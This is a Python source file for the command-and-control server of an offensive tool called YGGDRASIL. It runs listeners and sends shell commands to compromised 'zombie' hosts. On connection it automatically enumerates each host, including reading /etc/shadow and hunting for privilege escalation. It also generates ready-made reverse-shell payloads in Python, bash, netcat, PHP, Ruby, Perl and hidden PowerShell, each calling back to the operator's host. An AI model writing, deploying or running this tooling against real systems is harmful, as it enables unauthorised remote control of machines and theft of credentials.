import socket
import threading
import time
import uuid

C2_MAGIC = b"YGG!"
LISTENERS = {}
ZOMBIES = {}
C2_LOCK = threading.Lock()

def _sanitize_cmd(cmd):
    if not cmd:
        return ""
    cmd = cmd.strip()
    if len(cmd) > 4096:
        cmd = cmd[:4096]
    return cmd

def start_listener(port, bind_addr="0.0.0.0", name="Default Listener", auth_enabled=True, api_key=None):
    listener_id = str(uuid.uuid4())[:8]
    if auth_enabled and not api_key:
        api_key = uuid.uuid4().hex[:16]

    try:
        port = int(port)
        if port < 1 or port > 65535:
            return {"status": "error", "message": f"Invalid port: {port}. Must be 1-65535."}
    except ValueError:
        return {"status": "error", "message": f"Invalid port number: {port}"}

    with C2_LOCK:
        for lid, lst in LISTENERS.items():
            if lst["port"] == port and lst["status"] == "running":
                return {"status": "error", "message": f"Port {port} is already in use by Listener {lid}."}

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_sock.bind((bind_addr, port))
        server_sock.listen(5)
        server_sock.settimeout(2.0)
    except OSError as e:
        return {"status": "error", "message": f"Cannot bind to {bind_addr}:{port}: {e}"}

    listener = {
        "id": listener_id,
        "name": name,
        "port": port,
        "bind_addr": bind_addr,
        "status": "running",
        "auth_enabled": auth_enabled,
        "api_key": api_key,
        "socket": server_sock,
        "zombies": [],
        "started_at": time.time(),
        "total_connections": 0
    }

    with C2_LOCK:
        LISTENERS[listener_id] = listener

    thread = threading.Thread(target=_accept_loop, args=(listener_id,), daemon=True)
    thread.start()
    listener["thread"] = thread

    return {
        "status": "success",
        "listener_id": listener_id,
        "message": f"Listener '{name}' started on {bind_addr}:{port}",
        "port": port
    }

def stop_listener(listener_id):
    with C2_LOCK:
        listener = LISTENERS.get(listener_id)
        if not listener:
            return {"status": "error", "message": "Listener not found."}

        listener["status"] = "stopping"

        for zid in list(listener.get("zombies", [])):
            _disconnect_zombie(zid)

        try:
            listener["socket"].close()
        except Exception:
            pass

        listener["status"] = "stopped"
        return {"status": "success", "message": f"Listener {listener_id} stopped."}

def stop_all_listeners():
    with C2_LOCK:
        for lid in list(LISTENERS.keys()):
            stop_listener(lid)
    return {"status": "success", "message": "All listeners stopped."}

def get_listeners():
    result = []
    with C2_LOCK:
        for lid, lst in LISTENERS.items():
            result.append({
                "id": lst["id"],
                "name": lst["name"],
                "port": lst["port"],
                "bind_addr": lst.get("bind_addr", "0.0.0.0"),
                "status": lst["status"],
                "zombie_count": len(lst.get("zombies", [])),
                "total_connections": lst.get("total_connections", 0),
                "started_at": lst.get("started_at", 0),
                "uptime": int(time.time() - lst.get("started_at", time.time())) if lst["status"] == "running" else 0
            })
    return {"status": "success", "listeners": result}

def get_zombies(listener_id=None):
    result = []
    with C2_LOCK:
        for zid, zom in ZOMBIES.items():
            if listener_id and zom.get("listener_id") != listener_id:
                continue
            result.append({
                "id": zid,
                "listener_id": zom.get("listener_id"),
                "addr": zom.get("addr", ""),
                "hostname": zom.get("hostname", "Unknown"),
                "os_type": zom.get("os_type", "Unknown"),
                "connected_at": zom.get("connected_at", 0),
                "last_seen": zom.get("last_seen", 0),
                "status": zom.get("status", "unknown"),
                "output_size": len(zom.get("output", []))
            })
    return {"status": "success", "zombies": result}

def get_zombie_output(zombie_id, since=0):
    with C2_LOCK:
        zom = ZOMBIES.get(zombie_id)
        if not zom:
            return {"status": "error", "message": "Zombie not found."}
        output = zom.get("output", [])
        new_output = output[since:]
        return {
            "status": "success",
            "output": new_output,
            "count": len(new_output),
            "total": len(output),
            "zombie_status": zom.get("status", "unknown")
        }

def send_command(zombie_id, command):
    command = _sanitize_cmd(command)
    if not command:
        return {"status": "error", "message": "Empty command."}

    with C2_LOCK:
        zom = ZOMBIES.get(zombie_id)
        if not zom:
            return {"status": "error", "message": "Zombie not found."}
        if zom.get("status") != "connected":
            return {"status": "error", "message": f"Zombie is {zom.get('status')}."}

        sock = zom.get("socket")
        if not sock:
            return {"status": "error", "message": "Zombie socket lost."}

    try:
        cmd_bytes = (command + "\n").encode("utf-8", errors="replace")
        sock.sendall(cmd_bytes)
        ts = time.time()
        with C2_LOCK:
            zom["output"].append({"type": "command", "data": f"$ {command}", "time": ts})
            zom["pending"] = True
        return {"status": "success", "message": f"Command sent to {zombie_id}."}
    except Exception as e:
        _disconnect_zombie(zombie_id)
        return {"status": "error", "message": f"Failed to send: {e}"}

def disconnect_zombie(zombie_id):
    return _disconnect_zombie(zombie_id)

def _disconnect_zombie(zombie_id):
    with C2_LOCK:
        zom = ZOMBIES.get(zombie_id)
        if not zom:
            return {"status": "error", "message": "Zombie not found."}
        zom["status"] = "disconnected"
        try:
            sock = zom.get("socket")
            if sock:
                sock.close()
        except Exception:
            pass
        zom["socket"] = None
        lid = zom.get("listener_id")
        if lid and lid in LISTENERS:
            if zombie_id in LISTENERS[lid].get("zombies", []):
                LISTENERS[lid]["zombies"].remove(zombie_id)

    try:
        addr = zom.get("addr", "unknown") if zom else "unknown"
        from handlers.team_server import notify_zombie_disconnected
        notify_zombie_disconnected(zombie_id, addr)
    except Exception:
        pass

    return {"status": "success", "message": f"Zombie {zombie_id} disconnected."}

def _accept_loop(listener_id):
    with C2_LOCK:
        listener = LISTENERS.get(listener_id)
    if not listener:
        return

    server_sock = listener["socket"]

    while True:
        with C2_LOCK:
            if listener.get("status") != "running":
                break

        try:
            client_sock, addr = server_sock.accept()
            client_sock.settimeout(5.0)
        except socket.timeout:
            continue
        except OSError:
            break

        auth_enabled = listener.get("auth_enabled", True)
        api_key = listener.get("api_key", "YGG!")

        if auth_enabled:
            try:
                client_sock.settimeout(5.0)
                received_key = client_sock.recv(len(api_key)).decode('utf-8', errors='ignore').strip()
                if received_key != api_key:
                    client_sock.sendall(b"REJECTED\n")
                    client_sock.close()
                    with C2_LOCK:
                        listener["total_connections"] += 1
                    continue
                client_sock.sendall(b"ACCEPTED\n")
            except (socket.timeout, ConnectionResetError, OSError):
                try:
                    client_sock.close()
                except Exception:
                    pass
                continue

        zombie_id = str(uuid.uuid4())[:8]
        zombie = {
            "id": zombie_id,
            "listener_id": listener_id,
            "socket": client_sock,
            "addr": f"{addr[0]}:{addr[1]}",
            "hostname": addr[0],
            "os_type": "Unknown",
            "connected_at": time.time(),
            "last_seen": time.time(),
            "status": "connected",
            "output": [],
            "pending": False
        }

        with C2_LOCK:
            ZOMBIES[zombie_id] = zombie
            listener["zombies"].append(zombie_id)
            listener["total_connections"] += 1

        ts = time.time()
        zombie["output"].append({
            "type": "system",
            "data": f"[+] Authenticated connection from {addr[0]}:{addr[1]} — Zombie ID: {zombie_id}",
            "time": ts
        })

        try:
            from handlers.team_server import notify_zombie_connected
            notify_zombie_connected(zombie_id, addr[0], zombie["os_type"])
        except Exception:
            pass

        client_sock.settimeout(30.0)

        try:
            client_sock.settimeout(3.0)
            banner = client_sock.recv(4096)
            if banner:
                decoded = banner.decode("utf-8", errors="replace").strip()
                zombie["output"].append({
                    "type": "output",
                    "data": decoded,
                    "time": time.time()
                })
                if "Windows" in decoded or "cmd.exe" in decoded or "PowerShell" in decoded:
                    zombie["os_type"] = "Windows"
                elif "Linux" in decoded or "bash" in decoded or "sh-" in decoded:
                    zombie["os_type"] = "Linux"
        except socket.timeout:
            zombie["os_type"] = "Unknown (no banner)"
        except Exception:
            pass

        recv_thread = threading.Thread(
            target=_recv_loop,
            args=(zombie_id,),
            daemon=True
        )
        recv_thread.start()

        auto_enum_thread = threading.Thread(
            target=_auto_enum_zombie,
            args=(zombie_id,),
            daemon=True
        )
        auto_enum_thread.start()

def _auto_enum_zombie(zombie_id):
    time.sleep(2)
    with C2_LOCK:
        zom = ZOMBIES.get(zombie_id)
        if not zom or zom.get("status") != "connected":
            return
        os_type = zom.get("os_type", "")

    if "Windows" in os_type:
        commands = ["whoami", "hostname", "ipconfig /all", "netstat -an", "tasklist", "systeminfo", "net user", "whoami /priv", "dir C:\\Users\\"]
    else:
        commands = ["whoami", "hostname", "uname -a", "ifconfig 2>/dev/null || ip addr", "netstat -tulpn 2>/dev/null || netstat -an", "ps aux", "cat /etc/passwd 2>/dev/null", "cat /etc/shadow 2>/dev/null", "id", "sudo -l 2>/dev/null", "find / -perm -4000 -type f 2>/dev/null | head -20"]

    with C2_LOCK:
        zom["output"].append({
            "type": "system",
            "data": "[YGGDRASIL] Starting autonomous post-exploitation enumeration...",
            "time": time.time()
        })

    for cmd in commands:
        with C2_LOCK:
            zom = ZOMBIES.get(zombie_id)
            if not zom or zom.get("status") != "connected":
                return
            sock = zom.get("socket")
        if not sock:
            return

        try:
            cmd_bytes = (cmd + "\n").encode("utf-8", errors="replace")
            sock.sendall(cmd_bytes)
            time.sleep(1.5)
            sock.settimeout(2.0)
            try:
                data = sock.recv(8192)
                if data:
                    decoded = data.decode("utf-8", errors="replace")
                    with C2_LOCK:
                        if zom:
                            zom["output"].append({
                                "type": "output",
                                "data": f"$ {cmd}\n{decoded}",
                                "time": time.time()
                            })
                    _parse_enum_and_graph(zombie_id, cmd, decoded)
            except socket.timeout:
                pass
        except Exception:
            pass

    with C2_LOCK:
        if zom:
            zom["output"].append({
                "type": "system",
                "data": "[YGGDRASIL] Autonomous enumeration complete. Data added to Attack Graph.",
                "time": time.time()
            })


def _parse_enum_and_graph(zombie_id, cmd, output):
    try:
        from handlers.attack_graph import add_graph_node
        zom = ZOMBIES.get(zombie_id, {})
        addr = zom.get("addr", "unknown").split(":")[0]
        sesh_id = "c2_" + zombie_id

        if addr and addr != "unknown":
            add_graph_node(f"Zombie: {addr}", "target", parent_id=None, data={"zombie_id": zombie_id}, session_id=sesh_id)

        if "whoami" in cmd:
            username = output.strip().split("\n")[0].strip() if output.strip() else ""
            if username and len(username) < 100:
                add_graph_node(f"User: {username}", "vuln", parent_id=None, data={"type": "user", "source": cmd}, session_id=sesh_id)

        if "hostname" in cmd:
            host = output.strip().split("\n")[0].strip() if output.strip() else ""
            if host and len(host) < 100:
                add_graph_node(f"Host: {host}", "subdomain", parent_id=None, data={"type": "hostname", "source": cmd}, session_id=sesh_id)

        if "ipconfig" in cmd or "ifconfig" in cmd or "ip addr" in cmd:
            for line in output.split("\n"):
                line = line.strip()
                if any(kw in line.lower() for kw in ["inet ", "ipv4", "192.168.", "10.", "172."]):
                    parts = line.split()
                    for p in parts:
                        p = p.strip("();,")
                        if p.count(".") == 3 and any(octet.isdigit() for octet in p.split(".")):
                            add_graph_node(f"IP: {p}", "ip", parent_id=None, data={"type": "internal_ip", "source": cmd}, session_id=sesh_id)
                            break

        if "netstat" in cmd:
            for line in output.split("\n"):
                line = line.strip()
                for part in line.split():
                    if ":" in part and any(c.isdigit() for c in part):
                        addr_part = part.rsplit(":", 1)[0] if ":" in part else part
                        if addr_part.count(".") == 3 or "localhost" in addr_part:
                            add_graph_node(f"Connection: {addr_part}", "ip", parent_id=None, data={"type": "network_peer", "source": cmd}, session_id=sesh_id)
                            break
    except Exception:
        pass


def _recv_loop(zombie_id):
    while True:
        with C2_LOCK:
            zom = ZOMBIES.get(zombie_id)
            if not zom or zom.get("status") != "connected":
                break
            sock = zom.get("socket")

        if not sock:
            break

        try:
            sock.settimeout(2.0)
            data = sock.recv(8192)
            if not data:
                with C2_LOCK:
                    if zom:
                        zom["output"].append({
                            "type": "system",
                            "data": f"[!] Connection closed by {zom.get('addr', 'unknown')}",
                            "time": time.time()
                        })
                _disconnect_zombie(zombie_id)
                break

            decoded = data.decode("utf-8", errors="replace")
            ts = time.time()
            with C2_LOCK:
                if zom:
                    zom["output"].append({
                        "type": "output",
                        "data": decoded,
                        "time": ts
                    })
                    zom["last_seen"] = ts
                    zom["pending"] = False
        except socket.timeout:
            continue
        except (ConnectionResetError, ConnectionAbortedError, OSError):
            with C2_LOCK:
                if zom:
                    zom["status"] = "disconnected"
                    zom["output"].append({
                        "type": "system",
                        "data": f"[!] Connection lost: {zom.get('addr', 'unknown')}",
                        "time": time.time()
                    })
            _disconnect_zombie(zombie_id)
            break
        except Exception:
            continue

def execute_on_zombie(zombie_id, command):
    result = send_command(zombie_id, command)
    if result["status"] != "success":
        return result

    time.sleep(0.5)

    with C2_LOCK:
        zom = ZOMBIES.get(zombie_id)
        if not zom:
            return {"status": "error", "message": "Zombie vanished."}
        output = zom.get("output", [])
        recent = [o for o in output[-20:] if o.get("type") == "output"]
        return {
            "status": "success",
            "command": command,
            "response": "".join(o.get("data", "") for o in recent[-5:]) if recent else "(waiting for response...)"
        }

def generate_payload(listener_ip, listener_port, payload_type="python", arch="x64", api_key=None):
    if not api_key:
        api_key = "YGG!"
        with C2_LOCK:
            for lst in LISTENERS.values():
                if lst["port"] == int(listener_port) and lst["status"] == "running":
                    if lst.get("api_key"):
                        api_key = lst["api_key"]
                    break

    payloads = {
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{api_key}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{api_key}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "bash": f"printf '{api_key}' > /dev/tcp/{listener_ip}/{listener_port}; bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1",
        "nc": f"printf '{api_key}' | nc -q0 {listener_ip} {listener_port}; nc -e /bin/sh {listener_ip} {listener_port}",
        "nc_mkfifo": f"printf '{api_key}' | nc -q0 {listener_ip} {listener_port}; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {listener_ip} {listener_port} >/tmp/f",
        "php": f"php -r '$sock=fsockopen(\"{listener_ip}\",{listener_port});fwrite($sock,\"{api_key}\");fread($sock,1024);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby": f"ruby -rsocket -e's=TCPSocket.open(\"{listener_ip}\",{listener_port});s.write(\"{api_key}\");s.gets;f=s.to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "perl": f"perl -e 'use Socket;$i=\"{listener_ip}\";$p={listener_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));send(S,\"{api_key}\",0);recv(S,$x,1024,0);open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{listener_ip}',{listener_port});$s=$c.GetStream();$m=[text.encoding]::ASCII.GetBytes('{api_key}');$s.Write($m,0,$m.Length);$b=New-Object byte[] 1024;$s.Read($b,0,$b.Length)|Out-Null;while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
    }

    if payload_type not in payloads:
        return {"status": "error", "message": f"Unknown payload type: {payload_type}. Available: {', '.join(payloads.keys())}"}

    return {
        "status": "success",
        "payload": payloads[payload_type],
        "type": payload_type,
        "listener_ip": listener_ip,
        "listener_port": listener_port,
        "auth_enabled": True
    }
